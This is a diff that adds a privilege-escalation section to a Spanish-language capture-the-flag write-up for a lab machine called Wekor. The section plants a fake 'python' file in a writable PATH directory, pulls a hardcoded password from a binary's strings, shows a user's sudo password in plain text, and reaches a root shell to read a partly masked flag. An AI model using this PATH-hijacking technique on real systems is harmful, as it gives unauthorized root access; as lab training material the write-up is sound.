@@ -406,12 +406,81 @@ Enunciado :
     
             python /home/Orka/Desktop/transfer.py %c
 
-       -Podriamos crear un fichero llamado python con nuestro codigo y meterlo en una ruta del PATH anterior al actual para que al buscar python en el PATH encutre el nuestro primero.
+       - Podriamos crear un fichero llamado python con nuestro codigo y meterlo en una ruta del PATH anterior al actual para que al buscar python en el PATH encutre el nuestro primero.
 
+         1) Buscamos donde se encuentra el ejecutable python
+         
+                Orka@osboxes:~/Desktop$ which python
+                which python
+                /usr/bin/python
+            
+         2) Listamos path
           
-      
+                Orka@osboxes:~/Desktop$ echo $PATH
+                echo $PATH
+                /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+
+         3) Tenemos disponible en el path --> /usr/local/sbin  /usr/local/bin /usr/sbin
+         
+                  Orka@osboxes:~/Desktop$ ls -la /usr/        
+                   [...]
+                  drwxrwxr-x   2 root Orka 12288 Jan 23  2021 sbin ---> tenemos permisos de escritura por lo que aqui va nuestro executable python.
+                  [...]
+ 
+
+         4) Creamos nuestro fichero python en /usr/sbin/ 
+        
+                  Orka@osboxes:~/Desktop$ echo 'su root' > /usr/sbin/python
+                  echo 'su root' > /usr/sbin/python
+                  Orka@osboxes:~/Desktop$ chmod +x /usr/sbin/python
+                  chmod +x /usr/sbin/python
+
+        5) Ejecutamos y elevamos privilegios
+     
+           - Al ejecutar ./bitcoin nos pide una clave del propio programa, volviendo a analizar los strings del executable encontramos las password.
+          
+                  [...]
+                  t$,U
+                  [^_]
+                  Enter the password : 
+                  password ---------------------------> password que nos pide el programa para proseguir con la ejecucion de este.
+                  Access Denied... 
+                  Access Granted...
+                                          User Manual:
+                  Maximum Amount Of BitCoins Possible To Transfer at a time :
+                   [..]
+
+           - Ejecutamos el proceso de nuevo, leemos flag root.
+          
+                  Orka@osboxes:~/Desktop$ sudo -u root ./bitcoin
+                  sudo -u root ./bitcoin
+                  [sudo] password for Orka: OrkAiSC00L24/7$
+                  
+                  Enter the password : password
+                  password
+                  Access Granted...
+                                          User Manual:
+                  Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
+                  Amounts with more than one number will be stripped off! 
+                  And Lastly, be careful, everything is logged :) 
+                  Amount Of BitCoins : 2
+                  2
+             
+                  root@osboxes:/home/Orka/Desktop# whoami
+                  whoami
+                  root
+
+                  root@osboxes:~# cat root.txt
+                  cat root.txt
+                  f4e788f87c--------af0f0fe9ae6ad7
 
 
+---> Maquina  Wekor completa <---
+---
+     
+           
+            
+          
 
      
 
